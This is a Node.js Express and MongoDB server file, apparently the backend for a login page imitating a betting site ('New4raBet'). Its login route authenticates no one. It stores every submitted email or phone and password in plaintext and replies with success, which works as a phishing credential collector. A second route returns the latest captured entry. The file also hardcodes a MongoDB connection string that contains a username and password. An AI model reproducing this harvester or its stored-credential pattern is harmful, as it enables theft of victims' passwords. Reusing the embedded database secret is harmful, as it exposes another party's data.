const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
var corsOptions = {
  origin: '*',
  optionsSuccessStatus: 200
}
app.use(cors(corsOptions));
app.use(bodyParser.json());
app.use(express.json());

// MongoDB Connection
mongoose.connect('mongodb+srv://vishu:NdO3hK4ShLCi4YKD@cluster0.4iukcq5.mongodb.net/New4raBet', {

}).then(() => {
  console.log('Connected to MongoDB');
}).catch(err => {
  console.error('MongoDB connection error:', err);
});

// User Schema
const userSchema = new mongoose.Schema({
  email: { type: String },
  phone: { type: String },
  password: { type: String, required: true },
  loginMethod: { type: String, enum: ['email', 'phone'], required: true },
  loginDate: { type: String },
  loginTime: { type: String },
  createdAt: { type: Date, default: Date.now },
  loginHistory: [{
    date: { type: String },
    time: { type: String },
    method: { type: String },
    device: { type: String, default: 'Web Browser' }
  }]
});

const User = mongoose.model('User', userSchema);

// Routes
app.post('/api/login', async (req, res) => {
  try {
    const { email, phone, password, loginDate, loginTime, loginMethod } = req.body;
    
    // Create a new user entry for each login
    const user = new User({
      email: loginMethod === 'email' ? email : null,
      phone: loginMethod === 'phone' ? phone : null,
      password,
      loginMethod,
      loginDate,
      loginTime,
      loginHistory: [
        {
          date: loginDate,
          time: loginTime,
          method: loginMethod,
          device: 'Web Browser'
        }
      ]
    });
    
    await user.save();
    
    // Send user data back to client
    const userData = {
      id: user._id,
      email: user.email,
      phone: user.phone,
      loginMethod: user.loginMethod,
      loginDate: user.loginDate,
      loginTime: user.loginTime,
      createdAt: user.createdAt.toISOString().split('T')[0],
      loginHistory: user.loginHistory
    };
    
    res.status(200).json(userData);
    
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Get user details route
app.get('/api/user', async (req, res) => {
  try {
    // Get the most recent user
    const user = await User.findOne().sort({ createdAt: -1 });
    
    if (!user) {
      return res.status(404).json({ message: 'No users found' });
    }
    
    // Send user data back to client
    const userData = {
      id: user._id,
      email: user.email,
      phone: user.phone,
      loginMethod: user.loginMethod,
      loginDate: user.loginDate,
      loginTime: user.loginTime,
      createdAt: user.createdAt.toISOString().split('T')[0],
      loginHistory: user.loginHistory
    };
    
    res.status(200).json(userData);
    
  } catch (error) {
    console.error('Get user error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
app.get("/", (req, res) => {
  res.json({
    status: true
  })
})